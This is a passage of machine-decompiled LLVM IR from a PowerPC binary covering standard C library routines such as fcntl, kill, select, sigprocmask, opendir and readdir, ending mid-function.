define i32 @__libc_fcntl(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  store i32 %arg1, i32* @r29, align 4
  %v2_10009d8c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10009d8c, i32* %stack_var_-32, align 4
  %v0_10009d9c = load i32, i32* @r4, align 4
  store i32 %v0_10009d9c, i32* @r31, align 4
  %v0_10009da4 = load i32, i32* @r5, align 4
  store i32 %v0_10009da4, i32* @r30, align 4
  %v0_10009da8 = load i32, i32* @r2, align 4
  %v1_10009da8 = add i32 %v0_10009da8, -29808
  %v2_10009da8 = inttoptr i32 %v1_10009da8 to i32*
  %v3_10009da8 = load i32, i32* %v2_10009da8, align 4
  %v3_10009dac = icmp eq i32 %v3_10009da8, 0
  br i1 %v3_10009dac, label %dec_label_pc_10009dc4, label %dec_label_pc_10009db4

dec_label_pc_10009db4:                            ; preds = %entry
  %v3_10009db4 = icmp eq i32 %v0_10009d9c, 7
  br i1 %v3_10009db4, label %dec_label_pc_10009df8, label %dec_label_pc_10009dbc

dec_label_pc_10009dbc:                            ; preds = %dec_label_pc_10009db4
  %v3_10009dbc = icmp eq i32 %v0_10009d9c, 14
  br i1 %v3_10009dbc, label %dec_label_pc_10009df8, label %dec_label_pc_10009dc4

dec_label_pc_10009dc4:                            ; preds = %entry, %dec_label_pc_10009dbc
  %v0_10009dcc = call i32 @__asm_mfcr()
  store i32 %v0_10009dcc, i32* %r3.global-to-local, align 4
  %v1_10009dd0 = and i32 %v0_10009dcc, 268435456
  %v3_10009dd0 = icmp eq i32 %v1_10009dd0, 0
  store i1 %v3_10009dd0, i1* @cr0_eq, align 1
  br i1 %v3_10009dd0, label %dec_label_pc_10009e48, label %dec_label_pc_10009ddc

dec_label_pc_10009ddc:                            ; preds = %dec_label_pc_10009dc4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_10009de8 = load i32, i32* @r2, align 4
  %v1_10009dec = add i32 %v0_10009de8, -28672
  %v2_10009df0 = inttoptr i32 %v1_10009dec to i32*
  store i32 %v0_10009dcc, i32* %v2_10009df0, align 4
  %v0_10009e58.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009e48

dec_label_pc_10009df8:                            ; preds = %dec_label_pc_10009dbc, %dec_label_pc_10009db4
  store i32 268475900, i32* @lr, align 4
  %v0_10009df8 = call i32 @__libc_enable_asynccancel()
  %v0_10009dfc = load i32, i32* @r31, align 4
  store i32 %v0_10009dfc, i32* @r4, align 4
  store i32 %v0_10009df8, i32* @r28, align 4
  %v0_10009e04 = load i32, i32* @r30, align 4
  store i32 %v0_10009e04, i32* @r5, align 4
  %v0_10009e08 = load i32, i32* @r29, align 4
  store i32 %v0_10009e08, i32* %r3.global-to-local, align 4
  %v0_10009e14 = call i32 @__asm_mfcr()
  store i32 %v0_10009e14, i32* %r3.global-to-local, align 4
  %v1_10009e18 = and i32 %v0_10009e14, 268435456
  store i32 %v1_10009e18, i32* @r9, align 4
  %v3_10009e18 = icmp eq i32 %v1_10009e18, 0
  store i32 %v0_10009e14, i32* @r31, align 4
  br i1 %v3_10009e18, label %dec_label_pc_10009e3c, label %dec_label_pc_10009e24

dec_label_pc_10009e24:                            ; preds = %dec_label_pc_10009df8
  store i32 -1, i32* @r31, align 4
  %v0_10009e30 = load i32, i32* @r2, align 4
  %v1_10009e34 = add i32 %v0_10009e30, -28672
  store i32 %v1_10009e34, i32* @r9, align 4
  %v2_10009e38 = inttoptr i32 %v1_10009e34 to i32*
  store i32 %v0_10009e14, i32* %v2_10009e38, align 4
  br label %dec_label_pc_10009e3c

dec_label_pc_10009e3c:                            ; preds = %dec_label_pc_10009df8, %dec_label_pc_10009e24
  %v0_10009e3c = load i32, i32* @r28, align 4
  store i32 %v0_10009e3c, i32* %r3.global-to-local, align 4
  %v1_10009e40 = call i32 @__libc_disable_asynccancel(i32 %v0_10009e3c)
  %v0_10009e44 = load i32, i32* @r31, align 4
  store i32 %v0_10009e44, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009e48

dec_label_pc_10009e48:                            ; preds = %dec_label_pc_10009dc4, %dec_label_pc_10009ddc, %dec_label_pc_10009e3c
  %v0_10009e58 = phi i32 [ %v0_10009dcc, %dec_label_pc_10009dc4 ], [ %v0_10009e58.pre, %dec_label_pc_10009ddc ], [ %v0_10009e44, %dec_label_pc_10009e3c ]
  ret i32 %v0_10009e58

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 3, 4, 2, 5, 6, 7, 1, 0 }
  uselistorder label %dec_label_pc_10009e48, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009e3c, { 1, 0 }
  uselistorder label %dec_label_pc_10009dc4, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v0_10009e64 = call i32 @__asm_mfcr()
  ret i32 %v0_10009e64
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_10009e74 = call i32 @__asm_mfcr()
  %v1_10009e78 = and i32 %v0_10009e74, 268435456
  %v3_10009e78 = icmp eq i32 %v1_10009e78, 0
  %v0_10009e80 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10009e78, i32 %v0_10009e80)
  %v0_10009e90 = load i32, i32* @r2, align 4
  %v1_10009e94 = add i32 %v0_10009e90, -28672
  %v2_10009e98 = inttoptr i32 %v1_10009e94 to i32*
  store i32 %v0_10009e74, i32* %v2_10009e98, align 4
  ret i32 -1
}

define i32 @prctl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_10009ea8 = call i32 @__asm_mfcr()
  %v1_10009eac = and i32 %v0_10009ea8, 268435456
  %v3_10009eac = icmp eq i32 %v1_10009eac, 0
  %v0_10009eb4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10009eac, i32 %v0_10009eb4)
  %v0_10009ec4 = load i32, i32* @r2, align 4
  %v1_10009ec8 = add i32 %v0_10009ec4, -28672
  %v2_10009ecc = inttoptr i32 %v1_10009ec8 to i32*
  store i32 %v0_10009ea8, i32* %v2_10009ecc, align 4
  ret i32 -1
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_10009edc = call i32 @__asm_mfcr()
  %v1_10009ee0 = and i32 %v0_10009edc, 268435456
  %v3_10009ee0 = icmp eq i32 %v1_10009ee0, 0
  %v0_10009ee8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10009ee0, i32 %v0_10009ee8)
  %v0_10009ef8 = load i32, i32* @r2, align 4
  %v1_10009efc = add i32 %v0_10009ef8, -28672
  %v2_10009f00 = inttoptr i32 %v1_10009efc to i32*
  store i32 %v0_10009edc, i32* %v2_10009f00, align 4
  ret i32 -1
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %v0_10009f10 = call i32 @__asm_mfcr()
  %v1_10009f14 = and i32 %v0_10009f10, 268435456
  %v3_10009f14 = icmp eq i32 %v1_10009f14, 0
  %v0_10009f1c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10009f14, i32 %v0_10009f1c)
  %v0_10009f2c = load i32, i32* @r2, align 4
  %v1_10009f30 = add i32 %v0_10009f2c, -28672
  store i32 %v1_10009f30, i32* @r9, align 4
  %v2_10009f34 = inttoptr i32 %v1_10009f30 to i32*
  store i32 %v0_10009f10, i32* %v2_10009f34, align 4
  ret i32 -1
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r26, align 4
  store i32 %arg3, i32* @r31, align 4
  store i32 %arg4, i32* @r30, align 4
  %v0_10009f5c = load i32, i32* @r2, align 4
  %v1_10009f5c = add i32 %v0_10009f5c, -29808
  %v2_10009f5c = inttoptr i32 %v1_10009f5c to i32*
  %v3_10009f5c = load i32, i32* %v2_10009f5c, align 4
  %v3_10009f64 = icmp eq i32 %v3_10009f5c, 0
  br i1 %v3_10009f64, label %dec_label_pc_10009f6c, label %dec_label_pc_10009f80

dec_label_pc_10009f6c:                            ; preds = %entry
  %v0_10009f7c = call i32 @__syscall_select()
  br label %dec_label_pc_10009f80

dec_label_pc_10009f80:                            ; preds = %entry, %dec_label_pc_10009f6c
  store i32 268476292, i32* @lr, align 4
  %v0_10009f80 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_10009f80, i32* @r28, align 4
  store i32 268476320, i32* @lr, align 4
  %v0_10009f9c = call i32 @__syscall_select()
  store i32 %v0_10009f9c, i32* @r29, align 4
  %v0_10009fa4 = load i32, i32* @r28, align 4
  %v1_10009fa8 = call i32 @__libc_disable_asynccancel(i32 %v0_10009fa4)
  %v0_10009fb0 = load i32, i32* @r29, align 4
  ret i32 %v0_10009fb0

; uselistorder directives
  uselistorder label %dec_label_pc_10009f80, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10009fcc = call i32 @__asm_mfcr()
  %v1_10009fd0 = and i32 %v0_10009fcc, 268435456
  %v3_10009fd0 = icmp eq i32 %v1_10009fd0, 0
  %v0_10009fd8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10009fd0, i32 %v0_10009fd8)
  %v0_10009fe8 = load i32, i32* @r2, align 4
  %v1_10009fec = add i32 %v0_10009fe8, -28672
  %v2_10009ff0 = inttoptr i32 %v1_10009fec to i32*
  store i32 %v0_10009fcc, i32* %v2_10009ff0, align 4
  ret i32 -1
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v3_10009ff8 = icmp eq i32* %arg2, null
  br i1 %v3_10009ff8, label %dec_label_pc_1000a034, label %dec_label_pc_1000a004

dec_label_pc_1000a004:                            ; preds = %entry
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_1000a004 = load i32, i32* %arg2, align 4
  %v1_1000a008 = icmp slt i32 %v2_1000a004, 0
  %.pre = add i32 %tmp, 4
  %.pre2 = inttoptr i32 %.pre to i32*
  br i1 %v1_1000a008, label %dec_label_pc_1000a01c, label %dec_label_pc_1000a010

dec_label_pc_1000a010:                            ; preds = %dec_label_pc_1000a004
  %v3_1000a010 = load i32, i32* %.pre2, align 4
  %v1_1000a014 = urem i32 %v3_1000a010, 2
  %v3_1000a014 = icmp eq i32 %v1_1000a014, 0
  br i1 %v3_1000a014, label %dec_label_pc_1000a034, label %dec_label_pc_1000a01c

dec_label_pc_1000a01c:                            ; preds = %dec_label_pc_1000a004, %dec_label_pc_1000a010
  %v3_1000a01c = load i32, i32* %.pre2, align 4
  %v1_1000a02c = call i32 @__asm_rlwinm(i32 %v3_1000a01c, i32 0, i32 0, i32 30)
  br label %dec_label_pc_1000a034

dec_label_pc_1000a034:                            ; preds = %dec_label_pc_1000a010, %entry, %dec_label_pc_1000a01c
  %v0_1000a040 = call i32 @__asm_mfcr()
  store i32 %v0_1000a040, i32* %r3.global-to-local, align 4
  %v1_1000a044 = and i32 %v0_1000a040, 268435456
  %v3_1000a044 = icmp eq i32 %v1_1000a044, 0
  store i1 %v3_1000a044, i1* @cr0_eq, align 1
  br i1 %v3_1000a044, label %dec_label_pc_1000a068, label %dec_label_pc_1000a050

dec_label_pc_1000a050:                            ; preds = %dec_label_pc_1000a034
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1000a05c = load i32, i32* @r2, align 4
  %v1_1000a060 = add i32 %v0_1000a05c, -28672
  %v2_1000a064 = inttoptr i32 %v1_1000a060 to i32*
  store i32 %v0_1000a040, i32* %v2_1000a064, align 4
  %v0_1000a06c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a068

dec_label_pc_1000a068:                            ; preds = %dec_label_pc_1000a034, %dec_label_pc_1000a050
  %v0_1000a06c = phi i32 [ %v0_1000a040, %dec_label_pc_1000a034 ], [ %v0_1000a06c.pre, %dec_label_pc_1000a050 ]
  ret i32 %v0_1000a06c

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000a068, { 1, 0 }
  uselistorder label %dec_label_pc_1000a034, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a01c, { 1, 0 }
}

define i32 @__GI_time() local_unnamed_addr {
entry:
  %v0_1000a078 = call i32 @__asm_mfcr()
  ret i32 %v0_1000a078
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000a094 = load i32, i32* %arg1, align 4
  %v3_1000a098 = icmp eq i32 %v2_1000a094, -1
  br i1 %v3_1000a098, label %dec_label_pc_1000a0a0, label %dec_label_pc_1000a0c0

dec_label_pc_1000a0a0:                            ; preds = %entry
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1000a0b0 = load i32, i32* @r2, align 4
  %v1_1000a0b4 = add i32 %v0_1000a0b0, -28672
  %v2_1000a0b8 = inttoptr i32 %v1_1000a0b4 to i32*
  store i32 9, i32* %v2_1000a0b8, align 4
  br label %dec_label_pc_1000a140

dec_label_pc_1000a0c0:                            ; preds = %entry
  %v1_1000a0c0 = add i32 %tmp, 24
  %v2_1000a0c4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000a0c4, i32* @r28, align 4
  store i32 %v2_1000a0c4, i32* %r3.global-to-local, align 4
  %v5_1000a0d8 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 ptrtoint ([3 x i8]* @global_var_1000d02c.473 to i32), i32 %v1_1000a0c0)
  store i32 %v1_1000a0c0, i32* %r3.global-to-local, align 4
  %v1_1000a0e0 = call i32 @__pthread_return_0(i32 %v1_1000a0c0)
  store i32 %v1_1000a0e0, i32* %r3.global-to-local, align 4
  %v0_1000a0e8 = load i32, i32* @r31, align 4
  %v1_1000a0e8 = inttoptr i32 %v0_1000a0e8 to i32*
  %v2_1000a0e8 = load i32, i32* %v1_1000a0e8, align 4
  store i32 %v2_1000a0e8, i32* @r29, align 4
  store i32 -1, i32* %v1_1000a0e8, align 4
  store i32 %v2_1000a0c4, i32* %r3.global-to-local, align 4
  store i32 268476668, i32* @lr, align 4
  %v3_1000a0f8 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-40, i32 1)
  store i32 %v3_1000a0f8, i32* %r3.global-to-local, align 4
  %v0_1000a0fc = load i32, i32* @r31, align 4
  %v1_1000a0fc = add i32 %v0_1000a0fc, 12
  %v2_1000a0fc = inttoptr i32 %v1_1000a0fc to i32*
  %v3_1000a0fc = load i32, i32* %v2_1000a0fc, align 4
  store i32 %v3_1000a0fc, i32* @r3, align 4
  store i32 268476676, i32* @lr, align 4
  %v0_1000a100 = call i32 @free()
  %v0_1000a104 = load i32, i32* @r31, align 4
  store i32 %v0_1000a104, i32* @r3, align 4
  store i32 268476684, i32* @lr, align 4
  %v0_1000a108 = call i32 @free()
  %v0_1000a10c = load i32, i32* @r29, align 4
  store i32 %v0_1000a10c, i32* %r3.global-to-local, align 4
  %v0_1000a118 = call i32 @__asm_mfcr()
  store i32 %v0_1000a118, i32* %r3.global-to-local, align 4
  %v1_1000a11c = and i32 %v0_1000a118, 268435456
  %v3_1000a11c = icmp eq i32 %v1_1000a11c, 0
  br i1 %v3_1000a11c, label %dec_label_pc_1000a140, label %dec_label_pc_1000a128

dec_label_pc_1000a128:                            ; preds = %dec_label_pc_1000a0c0
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1000a134 = load i32, i32* @r2, align 4
  %v1_1000a138 = add i32 %v0_1000a134, -28672
  %v2_1000a13c = inttoptr i32 %v1_1000a138 to i32*
  store i32 %v0_1000a118, i32* %v2_1000a13c, align 4
  br label %dec_label_pc_1000a140

dec_label_pc_1000a140:                            ; preds = %dec_label_pc_1000a0c0, %dec_label_pc_1000a0a0, %dec_label_pc_1000a128
  %v0_1000a150 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000a150

; uselistorder directives
  uselistorder i32 %v1_1000a0c0, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 9, 2, 0, 3, 4, 5, 6, 8, 7, 10, 1 }
  uselistorder label %dec_label_pc_1000a140, { 2, 0, 1 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %v0_1000a158 = load i32, i32* @lr, align 4
  store i32 %v0_1000a158, i32* %r0.global-to-local, align 4
  store i32 268476788, i32* @lr, align 4
  %v1_1000a170 = call i32 @malloc(i32 48)
  %v3_1000a174 = icmp eq i32 %v1_1000a170, 0
  store i32 0, i32* @r31, align 4
  br i1 %v3_1000a174, label %dec_label_pc_1000a1f4, label %dec_label_pc_1000a180

dec_label_pc_1000a180:                            ; preds = %entry
  %v0_1000a180 = load i32, i32* @r30, align 4
  %v2_1000a180 = icmp ugt i32 %v0_1000a180, 511
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_1000a170, i32* %r31.global-to-local, align 4
  %v0_1000a18c = load i32, i32* @r29, align 4
  %v2_1000a18c = inttoptr i32 %v1_1000a170 to i32*
  store i32 %v0_1000a18c, i32* %v2_1000a18c, align 4
  %v0_1000a190 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000a190 = add i32 %v1_1000a170, 4
  %v3_1000a190 = inttoptr i32 %v2_1000a190 to i32*
  store i32 %v0_1000a190, i32* %v3_1000a190, align 4
  %v0_1000a194 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000a194 = add i32 %v1_1000a170, 16
  %v3_1000a194 = inttoptr i32 %v2_1000a194 to i32*
  store i32 %v0_1000a194, i32* %v3_1000a194, align 4
  %v0_1000a198 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000a198 = add i32 %v1_1000a170, 8
  %v3_1000a198 = inttoptr i32 %v2_1000a198 to i32*
  store i32 %v0_1000a198, i32* %v3_1000a198, align 4
  %v0_1000a19c = load i32, i32* @r30, align 4
  %v2_1000a19c = add i32 %v1_1000a170, 20
  %v3_1000a19c = inttoptr i32 %v2_1000a19c to i32*
  store i32 %v0_1000a19c, i32* %v3_1000a19c, align 4
  br i1 %v2_1000a180, label %dec_label_pc_1000a1ac, label %dec_label_pc_1000a1a4

dec_label_pc_1000a1a4:                            ; preds = %dec_label_pc_1000a180
  store i32 512, i32* %r0.global-to-local, align 4
  store i32 512, i32* %v3_1000a19c, align 4
  br label %dec_label_pc_1000a1ac

dec_label_pc_1000a1ac:                            ; preds = %dec_label_pc_1000a180, %dec_label_pc_1000a1a4
  %v0_1000a1ac = load i32, i32* %r31.global-to-local, align 4
  %v1_1000a1ac = add i32 %v0_1000a1ac, 20
  %v2_1000a1ac = inttoptr i32 %v1_1000a1ac to i32*
  %v3_1000a1ac = load i32, i32* %v2_1000a1ac, align 4
  store i32 268476856, i32* @lr, align 4
  %v2_1000a1b4 = call i32 @calloc(i32 1, i32 %v3_1000a1ac)
  %v3_1000a1b8 = icmp eq i32 %v2_1000a1b4, 0
  %v1_1000a1bc = load i32, i32* @r31, align 4
  %v2_1000a1bc = add i32 %v1_1000a1bc, 12
  %v3_1000a1bc = inttoptr i32 %v2_1000a1bc to i32*
  store i32 %v2_1000a1b4, i32* %v3_1000a1bc, align 4
  br i1 %v3_1000a1b8, label %dec_label_pc_1000a1c4, label %dec_label_pc_1000a1d4

dec_label_pc_1000a1c4:                            ; preds = %dec_label_pc_1000a1ac
  %v0_1000a1c4 = load i32, i32* @r31, align 4
  store i32 %v0_1000a1c4, i32* @r3, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a1d0.475 to i32), i32* @lr, align 4
  %v0_1000a1cc = call i32 @free()
  %v0_1000a1f8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a1f4

dec_label_pc_1000a1d4:                            ; preds = %dec_label_pc_1000a1ac
  %v0_1000a1e8 = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a1f4

dec_label_pc_1000a1f4:                            ; preds = %entry, %dec_label_pc_1000a1c4, %dec_label_pc_1000a1d4
  %v0_1000a1f8 = phi i32 [ 0, %entry ], [ %v0_1000a1f8.pre, %dec_label_pc_1000a1c4 ], [ %v0_1000a1e8, %dec_label_pc_1000a1d4 ]
  store i32 %v0_1000a158, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000a1f8

; uselistorder directives
  uselistorder i32 %v1_1000a170, { 0, 5, 3, 4, 2, 1, 6 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 2, 3, 4, 6 }
  uselistorder i32 512, { 7, 9, 8, 0, 2, 3, 4, 5, 6, 1, 10, 11, 12 }
  uselistorder label %dec_label_pc_1000a1f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a1ac, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v0_1000a22c = call i32 @__asm_mfcr()
  %v1_1000a230 = and i32 %v0_1000a22c, 268435456
  %v3_1000a230 = icmp eq i32 %v1_1000a230, 0
  store i32 %v0_1000a22c, i32* @r31, align 4
  br i1 %v3_1000a230, label %dec_label_pc_1000a258, label %dec_label_pc_1000a23c

dec_label_pc_1000a23c:                            ; preds = %entry
  store i32 0, i32* @r30, align 4
  %v0_1000a248 = load i32, i32* @r2, align 4
  %v1_1000a24c = add i32 %v0_1000a248, -28672
  %v2_1000a250 = inttoptr i32 %v1_1000a24c to i32*
  store i32 %v0_1000a22c, i32* %v2_1000a250, align 4
  br label %dec_label_pc_1000a2c4

dec_label_pc_1000a258:                            ; preds = %entry
  %v1_1000a258 = icmp slt i32 %v0_1000a22c, 0
  store i32 0, i32* @r30, align 4
  br i1 %v1_1000a258, label %dec_label_pc_1000a2c4, label %dec_label_pc_1000a264

dec_label_pc_1000a264:                            ; preds = %dec_label_pc_1000a258
  %v2_1000a264 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000a264, i32* @r4, align 4
  store i32 268477036, i32* @lr, align 4
  %v1_1000a268 = call i32 @fstat(i32 %v2_1000a264)
  %tmp5 = icmp sgt i32 %v1_1000a268, -1
  br i1 %tmp5, label %dec_label_pc_1000a288, label %dec_label_pc_1000a274

dec_label_pc_1000a274:                            ; preds = %dec_label_pc_1000a264
  %v0_1000a280 = call i32 @__asm_mfcr()
  br label %dec_label_pc_1000a2c4

dec_label_pc_1000a288:                            ; preds = %dec_label_pc_1000a264
  %v0_1000a28c = load i32, i32* @r31, align 4
  store i32 268477076, i32* @lr, align 4
  %v2_1000a290 = call i32 @fd_to_DIR(i32 %v0_1000a28c, i32 %tmp)
  store i32 %v2_1000a290, i32* @r30, align 4
  %v3_1000a294 = icmp eq i32 %v2_1000a290, 0
  br i1 %v3_1000a294, label %dec_label_pc_1000a29c, label %dec_label_pc_1000a2c4

dec_label_pc_1000a29c:                            ; preds = %dec_label_pc_1000a288
  %v0_1000a2a8 = call i32 @__asm_mfcr()
  %v0_1000a2b8 = load i32, i32* @r2, align 4
  %v1_1000a2bc = add i32 %v0_1000a2b8, -28672
  %v2_1000a2c0 = inttoptr i32 %v1_1000a2bc to i32*
  store i32 12, i32* %v2_1000a2c0, align 4
  br label %dec_label_pc_1000a2c4

dec_label_pc_1000a2c4:                            ; preds = %dec_label_pc_1000a288, %dec_label_pc_1000a258, %dec_label_pc_1000a274, %dec_label_pc_1000a23c, %dec_label_pc_1000a29c
  %v0_1000a2c8 = load i32, i32* @r30, align 4
  ret i32 %v0_1000a2c8

; uselistorder directives
  uselistorder i32 %v0_1000a22c, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000a2c4, { 4, 0, 2, 1, 3 }
}

define i32 @fdopendir(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_1000a2e4 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000a2e4, i32* @r4, align 4
  store i32 268477176, i32* @lr, align 4
  %v1_1000a2f4 = call i32 @fstat(i32 %v2_1000a2e4)
  store i32 %v1_1000a2f4, i32* %r3.global-to-local, align 4
  %v3_1000a2f8 = icmp eq i32 %v1_1000a2f4, 0
  br i1 %v3_1000a2f8, label %dec_label_pc_1000a300, label %dec_label_pc_1000a37c

dec_label_pc_1000a300:                            ; preds = %entry
  %v1_1000a304 = call i32 @__asm_rlwinm(i32 %tmp3, i32 0, i32 16, i32 19)
  %v3_1000a308 = icmp eq i32 %v1_1000a304, 16384
  br i1 %v3_1000a308, label %dec_label_pc_1000a328, label %dec_label_pc_1000a310

dec_label_pc_1000a310:                            ; preds = %dec_label_pc_1000a300
  br label %dec_label_pc_1000a364

dec_label_pc_1000a328:                            ; preds = %dec_label_pc_1000a300
  %v0_1000a328 = load i32, i32* @r31, align 4
  store i32 %v0_1000a328, i32* %r3.global-to-local, align 4
  store i32 3, i32* @r4, align 4
  store i32 268477240, i32* @lr, align 4
  %v2_1000a334 = call i32 @__libc_fcntl(i32 %v0_1000a328)
  store i32 %v2_1000a334, i32* %r3.global-to-local, align 4
  %v3_1000a338 = icmp eq i32 %v2_1000a334, -1
  br i1 %v3_1000a338, label %dec_label_pc_1000a37c, label %dec_label_pc_1000a340

dec_label_pc_1000a340:                            ; preds = %dec_label_pc_1000a328
  %v1_1000a340 = urem i32 %v2_1000a334, 4
  %v3_1000a344 = icmp eq i32 %v1_1000a340, 1
  br i1 %v3_1000a344, label %dec_label_pc_1000a34c, label %dec_label_pc_1000a36c

dec_label_pc_1000a34c:                            ; preds = %dec_label_pc_1000a340
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a364

dec_label_pc_1000a364:                            ; preds = %dec_label_pc_1000a310, %dec_label_pc_1000a34c
  %v0_1000a364 = phi i32 [ 20, %dec_label_pc_1000a310 ], [ 22, %dec_label_pc_1000a34c ]
  %storemerge.in = load i32, i32* @r2, align 4
  %storemerge = add i32 %storemerge.in, -28672
  %v2_1000a364 = inttoptr i32 %storemerge to i32*
  store i32 %v0_1000a364, i32* %v2_1000a364, align 4
  %v0_1000a390.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a380

dec_label_pc_1000a36c:                            ; preds = %dec_label_pc_1000a340
  %v0_1000a370 = load i32, i32* @r31, align 4
  store i32 %v0_1000a370, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a378.477 to i32), i32* @lr, align 4
  %v2_1000a374 = call i32 @fd_to_DIR(i32 %v0_1000a370, i32 %tmp)
  store i32 %v2_1000a374, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a380

dec_label_pc_1000a37c:                            ; preds = %entry, %dec_label_pc_1000a328
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000a380

dec_label_pc_1000a380:                            ; preds = %dec_label_pc_1000a36c, %dec_label_pc_1000a364, %dec_label_pc_1000a37c
  %v0_1000a390 = phi i32 [ %v2_1000a374, %dec_label_pc_1000a36c ], [ %v0_1000a390.pre, %dec_label_pc_1000a364 ], [ 0, %dec_label_pc_1000a37c ]
  ret i32 %v0_1000a390

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 7, 4, 5, 6, 8, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 (i32)* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_1000a380, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a37c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a364, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %v0_1000a398 = load i32, i32* @lr, align 4
  store i32 %v0_1000a398, i32* %r0.global-to-local, align 4
  %v1_1000a3a4 = add i32 %tmp, 24
  store i32 %tmp, i32* @r31, align 4
  %v5_1000a3bc = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 ptrtoint ([3 x i8]* @global_var_1000d02c.473 to i32), i32 %v1_1000a3a4)
  %v1_1000a3c4 = call i32 @__pthread_return_0(i32 %v1_1000a3a4)
  br label %dec_label_pc_1000a3c8

dec_label_pc_1000a3c8:                            ; preds = %dec_label_pc_1000a404, %entry
  %v0_1000a3c8 = load i32, i32* @r31, align 4
  %v1_1000a3c8 = add i32 %v0_1000a3c8, 4
  %v2_1000a3c8 = inttoptr i32 %v1_1000a3c8 to i32*
  %v3_1000a3c8 = load i32, i32* %v2_1000a3c8, align 4
  store i32 %v3_1000a3c8, i32* %r0.global-to-local, align 4
  %v1_1000a3cc = add i32 %v0_1000a3c8, 8
